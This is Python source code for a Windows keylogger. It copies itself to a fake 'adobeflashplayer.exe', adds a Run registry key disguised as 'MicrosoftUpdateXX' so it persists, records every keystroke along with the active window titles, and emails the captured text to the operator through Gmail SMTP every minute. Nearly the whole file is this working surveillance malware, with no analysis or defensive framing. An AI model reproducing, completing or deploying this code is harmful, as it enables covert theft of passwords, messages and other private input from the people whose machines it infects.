import pythoncom
import pyHook
from os import path
from time import sleep
from threading import Thread
import urllib, urllib2
import smtplib
import datetime
import win32com.client
import win32event, win32api, winerror
from _winreg import *
import shutil
import sys

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print "nope"
    sys.exit()

x, data, count= '', '', 0

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
debugFile = "debug.txt"
lastWindow = ''

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
if not path.isfile(dir):
    startup()   

    
def send_mail():
    global data
    while True:
        write_to_debug_file("\n===== SENDING EMAIL: DEBUG MODE =====\n" + "Data Content Length: " + str(len(data)) + "\n" + "Keylogger Content: " + data + "\n" + "Email: " + EEMAIL + "\n" + "Password: " + EPASS + "\n" + "[*] SENDING EMAIL NOW" + "\n")
        if len(data) > 0:
            timeInSecs = datetime.datetime.now()
            SERVER = "smtp.gmail.com"
            PORT = 587
            USER = EEMAIL
            PASS = EPASS
            FROM = USER
            TO = [USER]
            SUBJECT = "B33: " + timeInSecs.isoformat() 
            MESSAGE =  data 

            message_payload = "\r\n".join((
                                "From: %s" %FROM,
                                "To: %s" %TO,
                                "Subject: %s" %SUBJECT,
                                "",
                                MESSAGE))
            try:
                server = smtplib.SMTP()
                server.connect(SERVER, PORT)
                server.starttls()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message_payload)
                data = ''
                server.quit()
                file_object.write("[*] Data Sent!" + "\n")
            except Exception as error:
                print error
                write_to_debug_file("[*] Error Encountered: " + error + "\n")
        else:
		    write_to_debug_file("[*] Error Encountered: No content found, email will not be sent\n")
        sleep(60)


def write_to_debug_file(string_to_write):
    if(DEBUG_INPUT == 'y'):
        file_object = open(debugFile, "a+")
        file_object.write(string_to_write)
        file_object.close()
	
		
def pushing(event):
    global data, lastWindow
    window = event.WindowName
    keys = {
            13: ' [ENTER] ',
            8: ' [BACKSPACE] ',
            162: ' [CTRL] ',
            163: ' [CTRL] ',
            164: ' [ALT] ',
            165: ' [ALT] ',
            160: ' [SHIFT] ',
            161: ' [SHIFT] ',
            46: ' [DELETE] ',
            32: ' [SPACE] ',
            27: ' [ESC] ',
            9: ' [TAB] ',
            20: ' [CAPSLOCK] ',
            38: ' [UP] ',
            40: ' [DOWN] ',
            37: ' [LEFT] ',
            39: ' [RIGHT] ',
            91: ' [SUPER] '
            }
    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
    if window != lastWindow:
        lastWindow = window
        data += ' { ' + lastWindow + ' } '
        data += keyboardKeyName 
    else:
        data += keyboardKeyName

if __name__ == '__main__':
    triggerThread = Thread(target=send_mail)
    triggerThread.start()

    hookManager = pyHook.HookManager()
    hookManager.KeyDown = pushing
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()
